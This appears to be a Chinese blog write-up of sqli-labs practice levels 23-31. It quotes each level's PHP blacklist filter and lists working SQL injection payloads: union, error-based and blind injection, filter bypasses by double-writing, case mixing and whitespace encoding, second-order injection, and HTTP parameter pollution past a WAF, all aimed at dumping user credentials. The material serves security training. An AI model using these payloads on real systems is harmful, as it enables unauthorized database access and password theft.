# sqli-labs靶场(4)绕过


sqli-labs靶场精简记录23-31

<!--more-->

### Less-23 GET - Error based - strip comments 

基于错误的，过滤注释的GET型

注释符号被过滤了

bypass

```
?id=1' or '1'='1
```

payload

```
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1
 
 
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1
 
 
?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1
```

### Less - 24 Second Degree Injections *Real treat* -Store Injections 

二次注入

```php
#login.php
function sqllogin(){

   $username = mysql_real_escape_string($_POST["login_user"]);
   $password = mysql_real_escape_string($_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
...
      $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');
      
      
#pass_change.php
	$username= $_SESSION["username"];
	$curr_pass= mysql_real_escape_string($_POST['current_password']);
	$pass= mysql_real_escape_string($_POST['password']);
	$re_pass= mysql_real_escape_string($_POST['re_password']);
	
	if($pass==$re_pass)
	{	
		$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```

登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义了

在修改用户名这里，从 session 中直接获得了用户名，并且直接用于更新语句并未做检查，从根本上来说，插入数据时没有做过滤，只是做了转义处理

也就是说当前用户中如果含有注释，便可以更改当前用户名中包含的另一用户的密码，例如注册用户`Dumb’– +` 那么他就可以更改 `Dumb` 的密码

### Less-25 Trick with OR & AND

过滤了or和and

waf

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	
	return $id;
}
```

过滤的方式是替换为空

bypass

```
双写绕过		oorr
大小写变形绕过  	or=Or=oR=OR
利用运算符		or=||  and=&&
url编码绕过		#=%23,hex编码 ~=0x7e
添加注释		/*or*/
```

### Less-25a Trick with OR & AND Blind

过滤了or和and的盲注

可以用脚本 Bool 或 Time 盲注

### Less-26 Trick with comments and space

过滤了注释和空格的注入

waf

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

不仅过滤了or 与 and, 还过滤了单行注释--与#,以及多行注释 /**/,还过滤了空格，以及正反斜杠 /

注释符号bypass：

```
构造'来闭合后面的'
```

空格bypass：

```
%09 	TAB水平
%0a 	新建一行
%0c		新建一页
%0d		return功能
%0b		TAB(垂直)
%a0		空格
```

payload

```
#报错注入
爆数据库:
'||updatexml(1,concat('$',(database())),0)||'1'='1
爆表:
'||updatexml(1,concat('$',(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),0)||'1'='1
爆字段:
'||updatexml(1,concat('$',(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security')%26%26(table_name='users'))),0)||'1'='1
爆数据:
'||updatexml(1,concat('$',(select(concat('$',id,'$',username,'$',passwoorrd))from(users)limit%0b0,1)),0)||'1'='1

#布尔盲注
1'%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))>65)||'1'='
```

### less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us

过滤了空格和注释的盲注

关闭了详细的报错，可进行盲注，闭合使用`')`

payload类似上题

### less 27 GET - Error Based- All your UNION & SELECT belong to us

过滤了union和select的

```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out select
return $id;
}
```

bypass

```
大小写绕过	seleCt UniOn
空格	/*%0a*/ 或者 %0a
```

payload

```
爆库:
0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,database(),2/*%0a*/||/*%0a*/'1'='1
爆表:
0'%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security'),3||'1
爆字段:
0'%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema='security'%0bAnd%0btable_name='users'%0b%26%26%0b'1'='1
爆数据:
0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,(SeLeCt/*%0a*/group_concat(concat_ws('$',id,username,password))/*%0a*/from/*%0a*/users),3/*%0a*/||/*%0a*/'1'='1
```

### less 27a GET - Blind Based- All your UNION & SELECT belong to us

盲注，过滤了union和select

双引号进行闭合，bypass方式同上

### less 28 GET - Error Based- All your UNION & SELECT belong to us String-Single quote with parenthesis

基于错误的，有括号的单引号字符型，过滤了union和select等的注入

```php
function blacklist($id)
{
# 过滤 /*
$id= preg_replace('/[\/\*]/',"", $id);

# 过滤 - # 注释
$id= preg_replace('/[--]/',"", $id);
$id= preg_replace('/[#]/',"", $id);

# 过滤 空格 +
$id= preg_replace('/[ +]/',"", $id);.

# 过滤 union select /i 大小写都过滤
$id= preg_replace('/union\s+select/i',"", $id);
return $id;
}
```

过滤了相连的 union 加 空格 加 select，同时匹配大小写

bypass

```
#双写绕过
?id=0')uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'and ('1

#或者
?id=0')%0buniOn%0bsElEct%0b1,database(),3%0bor%0b('1')=('1 
```

### less 28a GET - Bind Based- All your UNION & SELECT belong to us String-Single quote with parenthesis

基于盲注的，有括号的单引号字符型，过滤了union和select等的注入

只过滤了union select

绕过方式同上题

### Less-29 GET -Error based- IMPIDENCE MISMATCH- Having a WAF in front of web application.

基于WAF的一个错误

服务器架构

![image-20241127111831331](C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241127111831331.png)

client 访问服务器，能直接访问到 Tomcat 服务器，然后 tomcat 服务器在向 Apache 服务器请求数据，数据返回路径刚好相反

HTTP参数污染

不同的中间件在处理参数重复问题解析到的参数不同

```
e.g. index.php?id=1&id=2
apache(php)解析最后一个参数,即回显id=2
而tomcat(jsp)解析第一个参数,即回显id=1
```

![image-20220317222232693](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203172222840.png)

在本题目当中，waf在tomcat，对第一个参数进行了过滤，二apache解析的是第二个参数

payload

```
#爆表
?id=1&id=-2%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+

#爆字段
?id=1&id=-2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database() and table_name='users'--+
 
#爆密码账户
?id=1&id=-2%27%20union%20select%201,group_concat(password,username),3%20from%20users--+
```

### Less-30 Get-Blind Havaing with WAF

同上题，闭合方式变为双引号

### Less-31 Protection with WAF

bypass同上，闭合方式变为`")`
